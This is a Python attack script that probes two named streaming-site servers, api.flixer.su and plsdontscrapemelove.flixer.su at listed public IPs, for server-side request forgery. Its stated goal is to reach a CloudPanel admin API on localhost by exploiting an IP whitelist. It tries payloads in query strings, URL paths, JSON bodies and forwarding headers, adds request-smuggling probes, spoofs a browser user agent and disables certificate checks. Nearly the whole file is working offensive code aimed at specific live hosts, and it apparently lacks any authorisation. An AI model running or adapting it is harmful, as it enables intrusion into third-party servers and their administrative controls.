#!/usr/bin/env python3
"""SSRF probe against Flixer Express APIs to reach CloudPanel on localhost.

Goal: Make a request from Express -> CloudPanel API on 127.0.0.1:8443
This exploits the ApiTokenAuthenticator IP whitelist (127.0.0.1, 172.17.0.1).
"""
import requests
import urllib.parse
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# The two Express APIs - one on each bare metal server
# api.flixer.su -> 5.181.0.197 (same host as CloudPanel on :8443)
# plsdontscrapemelove.flixer.su -> 91.199.133.5 (same host as CloudPanel on :8443)
EXPRESS_TARGETS = [
    ("https://5.181.0.197", "api.flixer.su", "Auth API + CloudPanel"),
    ("https://91.199.133.5", "plsdontscrapemelove.flixer.su", "Content API + CloudPanel"),
]

CLOUDPANEL_SSRF_TARGETS = [
    # These are what we want the Express API to fetch FOR us
    "https://127.0.0.1:8443/api/v1/users",
    "https://127.0.0.1:8443/api/v1/sites",
    "https://127.0.0.1:8443/api/users",
    "https://127.0.0.1:8443/api/sites",
    "https://127.0.0.1:8443/api/test",
    "https://127.0.0.1:8443/api/status",
    "http://127.0.0.1:8443/api/v1/users",
    "http://127.0.0.1:8443/api/v1/sites",
    "http://localhost:8443/api/v1/users",
    "http://localhost:8443/api/v1/sites",
    "https://[::1]:8443/api/v1/users",
    # Also try hitting CloudPanel on its HTTP port in case it listens internally
    "http://127.0.0.1:80/api/v1/users",
    "http://127.0.0.1:8080/api/v1/users",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, text/html",
}

def probe_ssrf(target_url, target_host, ssrf_payload, method="GET", param_name=None, param_location="query",
               extra_headers=None, body_template=None):
    """Try an SSRF payload and report results."""
    try:
        h = HEADERS.copy()
        h["Host"] = target_host
        if extra_headers:
            h.update(extra_headers)

        if param_location == "query" and param_name:
            url = f"{target_url}?{param_name}={urllib.parse.quote(ssrf_payload, safe='')}"
            r = requests.get(url, headers=h, verify=False, timeout=15, allow_redirects=False)
        elif param_location == "path":
            url = f"{target_url}/{urllib.parse.quote(ssrf_payload, safe='')}"
            r = requests.get(url, headers=h, verify=False, timeout=15, allow_redirects=False)
        elif method == "POST" and body_template and param_name:
            body = body_template.replace("{{PAYLOAD}}", ssrf_payload)
            r = requests.post(target_url, headers=h, data=body, verify=False, timeout=15, allow_redirects=False)
        else:
            return None

        # Look for signs of SSRF success
        result = {
            "status": r.status_code,
            "len": len(r.text),
            "body_preview": r.text[:300].replace('\n', ' '),
            "headers": dict(r.headers),
        }

        # CloudPanel API returns JSON with specific patterns
        is_interesting = False
        if r.status_code == 200 and r.headers.get("Content-Type", "").startswith("application/json"):
            try:
                data = r.json()
                if isinstance(data, (list, dict)) and len(str(data)) > 20:
                    is_interesting = True
                    result["json"] = str(data)[:400]
            except:
                pass

        # Look for CloudPanel-specific indicators
        for indicator in ["cloudpanel", "clp", "ROLE_", "userName", "clpctl", "Symfony"]:
            if indicator.lower() in r.text.lower():
                is_interesting = True
                break

        if r.status_code not in (404, 400, 403, 405, 301, 302, 500) or is_interesting:
            return result

        return None
    except Exception as e:
        return {"status": 0, "error": str(e)[:150]}


def main():
    for target_url, target_host, desc in EXPRESS_TARGETS:
        print(f"\n{'='*70}")
        print(f"[*] Target: {target_url} ({target_host}) - {desc}")
        print(f"{'='*70}")

        # ── 1. AUTH API ENDPOINTS ──
        if "api.flixer.su" in target_host:
            print("\n[1] Auth API - common SSRF parameters:")
            auth_endpoints = [
                # Registration might have avatar/photo URL
                ("/api/auth/register", "POST", ["photo", "avatar", "image", "picture", "url", "thumbnail"]),
                # Login might have redirect
                ("/api/auth/login", "GET", ["redirect", "next", "return", "callback", "redirect_uri", "continue"]),
                # Password reset with callback
                ("/api/auth/forgot-password", "POST", ["email", "callback", "redirect", "return"]),
                # OAuth endpoints
                ("/api/auth/oauth", "GET", ["redirect_uri", "callback", "state", "return"]),
                ("/api/auth/google", "GET", ["redirect_uri", "callback", "state"]),
                ("/api/auth/github", "GET", ["redirect_uri", "callback"]),
                # Profile update
                ("/api/auth/profile", "POST", ["avatar", "photo", "image", "url", "thumbnail"]),
                # Webhook
                ("/api/auth/webhook", "POST", ["url", "callback", "endpoint", "webhook_url"]),
                # Generic API
                ("/api/", "GET", ["url", "path", "file", "image", "fetch", "proxy", "redirect"]),
            ]

            for endpoint, method, params in auth_endpoints:
                for param in params:
                    for ssrf_target in CLOUDPANEL_SSRF_TARGETS[:3]:  # Limit to avoid huge output
                        r = probe_ssrf(
                            f"{target_url}{endpoint}", target_host, ssrf_target,
                            method=method, param_name=param, param_location="query"
                        )
                        if r and r.get("status", 0) not in (404, 400, 403, 405, 0):
                            status = r.get("status", "?")
                            body = r.get("body_preview", "")[:120]
                            print(f"  [{status}] {method} {endpoint}?{param}={ssrf_target[:50]}... -> {r.get('len',0)}b {body}")

        # ── 2. CONTENT API ENDPOINTS ──
        if "plsdontscrapemelove" in target_host:
            print("\n[1] Content API - SSRF parameters:")
            content_endpoints = [
                # TMDB proxy might fetch images
                ("/api/tmdb/movie/550/images", "GET", ["url", "image", "path", "file", "proxy", "source", "cdn", "base_url", "image_url"]),
                ("/api/time", "GET", ["url", "callback", "source"]),
                # Image endpoints
                ("/api/image", "GET", ["url", "src", "path"]),
                ("/api/proxy", "GET", ["url", "to", "target"]),
                ("/api/fetch", "GET", ["url", "href", "link"]),
                # Asset endpoints
                ("/assets/client/tmdb-image-enhancer.js", "GET", ["url", "path"]),
            ]

            for endpoint, method, params in content_endpoints:
                for param in params:
                    for ssrf_target in CLOUDPANEL_SSRF_TARGETS[:3]:
                        r = probe_ssrf(
                            f"{target_url}{endpoint}", target_host, ssrf_target,
                            method=method, param_name=param, param_location="query"
                        )
                        if r and r.get("status", 0) not in (404, 400, 403, 405, 0):
                            status = r.get("status", "?")
                            body = r.get("body_preview", "")[:120]
                            print(f"  [{status}] {method} {endpoint}?{param}={ssrf_target[:50]}... -> {r.get('len',0)}b {body}")

        # ── 3. PATH-BASED SSRF ──
        print("\n[2] Path-based SSRF:")
        path_payloads = [
            "https://127.0.0.1:8443/api/v1/users",
            "http://127.0.0.1:8443/api/v1/users",
            "https://localhost:8443/api/v1/users",
        ]
        base_endpoints = ["/api/proxy/", "/api/fetch/", "/api/image/", "/proxy/", "/fetch/"]
        for endpoint in base_endpoints:
            for payload in path_payloads:
                r = probe_ssrf(
                    f"{target_url}{endpoint}", target_host, payload,
                    param_location="path"
                )
                if r and r.get("status", 0) not in (404, 400, 403, 405, 301, 302, 0):
                    print(f"  [{r['status']}] {endpoint}{payload[:60]} -> {r['len']}b")

        # ── 4. POST BODY SSRF ──
        print("\n[3] POST body SSRF:")
        post_templates = [
            '{"url":"{{PAYLOAD}}"}',
            '{"image":"{{PAYLOAD}}"}',
            '{"avatar":"{{PAYLOAD}}"}',
            '{"callback":"{{PAYLOAD}}"}',
            '{"webhook_url":"{{PAYLOAD}}"}',
            '{"redirect_uri":"{{PAYLOAD}}"}',
            '{"path":"{{PAYLOAD}}"}',
            '{"file":"{{PAYLOAD}}"}',
            'url={{PAYLOAD}}',
        ]
        post_endpoints = [
            "/api/auth/register",
            "/api/auth/profile",
            "/api/auth/webhook",
            "/api/auth/forgot-password",
            "/api/webhook",
            "/api/proxy",
            "/api/fetch",
            "/api/import",
            "/api/upload",
        ]
        for endpoint in post_endpoints:
            for template in post_templates[:5]:
                for ssrf_target in CLOUDPANEL_SSRF_TARGETS[:2]:
                    h = HEADERS.copy()
                    h["Host"] = target_host
                    h["Content-Type"] = "application/json"
                    body = template.replace("{{PAYLOAD}}", ssrf_target)
                    try:
                        r = requests.post(f"{target_url}{endpoint}", headers=h, data=body,
                                        verify=False, timeout=15, allow_redirects=False)
                        if r.status_code not in (404, 400, 403, 405, 301, 302):
                            print(f"  [{r.status_code}] POST {endpoint} {template[:60]} -> {len(r.text)}b {r.text[:150]}")
                    except Exception as e:
                        pass

        # ── 5. HEADER-BASED SSRF ──
        print("\n[4] Header-based SSRF (X-Forwarded-Host, etc.):")
        header_payloads = {
            "X-Forwarded-Host": "127.0.0.1:8443",
            "X-Host": "127.0.0.1:8443",
            "X-Forwarded-Server": "127.0.0.1:8443",
            "X-Original-URL": "/api/v1/users",
            "X-Rewrite-URL": "/api/v1/users",
            "X-HTTP-Host-Override": "127.0.0.1:8443",
            "Forwarded": "host=127.0.0.1:8443",
            "Referer": "https://127.0.0.1:8443/api/v1/users",
            "Origin": "https://127.0.0.1:8443",
        }
        for header_name, header_value in header_payloads.items():
            r = probe_ssrf(f"{target_url}/", target_host, "", extra_headers={header_name: header_value})
            if r and r.get("status", 0) not in (404, 400, 301, 302, 0):
                print(f"  [{r['status']}] {header_name}: {header_value} -> {r['len']}b")

        # ── 6. REQUEST SMUGGLING / HOP-BY-HOP ──
        print("\n[5] HTTP Request Smuggling probes:")
        smuggling_headers = [
            {"Transfer-Encoding": "chunked", "Content-Length": "0"},
            {"Content-Length": "0", "Transfer-Encoding": "chunked"},
            {"Transfer-Encoding": "identity"},
        ]
        for extra_h in smuggling_headers:
            r = probe_ssrf(f"{target_url}/", target_host, "", extra_headers=extra_h)
            if r and r.get("status", 0) not in (404, 400, 301, 302, 0):
                print(f"  [{r['status']}] smuggle={extra_h}")

        # ── 7. KNOWN EXPRESS/NGINX SSRF PATHS ──
        print("\n[6] Known vulnerable Express paths:")
        express_paths = [
            "/proxy/", "/fetch/", "/request/", "/curl/",
            "/api/proxy/", "/api/fetch/", "/api/request/",
            "/_next/image", "/_ipx/",  # Next.js image proxy
            "/image/", "/img/", "/thumb/", "/thumbnail/",
            "/avatar/", "/og-image/", "/og/",
            "/webhook/", "/webhooks/",
            "/import/", "/download/",
            "/.well-known/", "/wp-json/",
            "/graphql", "/api/graphql",
        ]
        for path in express_paths:
            r = probe_ssrf(f"{target_url}{path}", target_host, "")
            if r and r.get("status", 0) not in (404, 400, 403, 301, 302, 0):
                print(f"  [{r['status']}] {path} -> {r['len']}b {r.get('body_preview','')[:100]}")

        # ── 8. DIRECT CLOUDPANEL API CALL (just in case) ──
        print("\n[7] Direct CloudPanel API calls from Express IP:")
        cloudpanel_urls = [
            "https://127.0.0.1:8443/api/v1/users",
            "https://127.0.0.1:8443/api/users",
            "https://localhost:8443/api/v1/users",
        ]
        # This won't work from our machine but worth checking the error
        h = HEADERS.copy()
        h["Host"] = target_host
        h["Authorization"] = "Bearer anything"
        for cp_url in cloudpanel_urls:
            try:
                r = requests.get(f"{target_url}/", headers=h, verify=False, timeout=10)
                # Not expecting this to reach CloudPanel - just checking what the Express API returns
            except:
                pass


if __name__ == "__main__":
    main()
